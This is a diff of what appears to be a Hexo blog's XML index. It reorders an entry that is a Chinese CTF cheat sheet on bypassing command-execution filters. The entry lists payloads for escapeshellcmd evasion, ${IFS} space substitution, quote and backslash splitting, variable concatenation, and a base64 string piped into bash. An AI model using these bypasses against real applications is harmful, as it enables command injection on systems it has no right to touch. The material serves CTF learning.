@@ -154,31 +154,6 @@
     
     
     <entry>
-      <title>CTF中命令执行绕过方法</title>
-      <link href="/2023/11/23/day6/"/>
-      <url>/2023/11/23/day6/</url>
-      
-        <content type="html"><![CDATA[<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a><strong>命令执行绕过</strong></h1><h2 id="escapeshellcmd函数绕过方法："><a href="#escapeshellcmd函数绕过方法：" class="headerlink" title="escapeshellcmd函数绕过方法："></a>escapeshellcmd函数绕过方法：</h2><p>1.执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post=../ %1a whoami</span><br></pre></td></tr></table></figure><p>2.宽字节注入</p><h2 id="空格过滤："><a href="#空格过滤：" class="headerlink" title="空格过滤："></a>空格过滤：</h2><p>1.${IFS}</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;$9flag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$IFS$9flag</span><br></pre></td></tr></table></figure><p>2.重定向符&lt;&gt;</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>1.拼接</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><p>2.利用已存在的资源</p><p>从已有的文件或者环境变量中获得相应的字符。</p><p>3.base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>4.单引号、双引号</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&quot;&quot;ag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure><p>5.反斜线 \</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><p>6.LINUX下一些已有字符</p><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> web php </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> php </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>xss攻击基础了解</title>
       <link href="/2023/11/23/day7/"/>
       <url>/2023/11/23/day7/</url>
@@ -196,6 +171,31 @@
         <tags>
             
             <tag> host </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTF中命令执行绕过方法</title>
+      <link href="/2023/11/23/day6/"/>
+      <url>/2023/11/23/day6/</url>
+      
+        <content type="html"><![CDATA[<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a><strong>命令执行绕过</strong></h1><h2 id="escapeshellcmd函数绕过方法："><a href="#escapeshellcmd函数绕过方法：" class="headerlink" title="escapeshellcmd函数绕过方法："></a>escapeshellcmd函数绕过方法：</h2><p>1.执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post=../ %1a whoami</span><br></pre></td></tr></table></figure><p>2.宽字节注入</p><h2 id="空格过滤："><a href="#空格过滤：" class="headerlink" title="空格过滤："></a>空格过滤：</h2><p>1.${IFS}</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;$9flag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$IFS$9flag</span><br></pre></td></tr></table></figure><p>2.重定向符&lt;&gt;</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>1.拼接</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><p>2.利用已存在的资源</p><p>从已有的文件或者环境变量中获得相应的字符。</p><p>3.base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>4.单引号、双引号</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&quot;&quot;ag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure><p>5.反斜线 \</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><p>6.LINUX下一些已有字符</p><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web php </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php </tag>
             
         </tags>
       
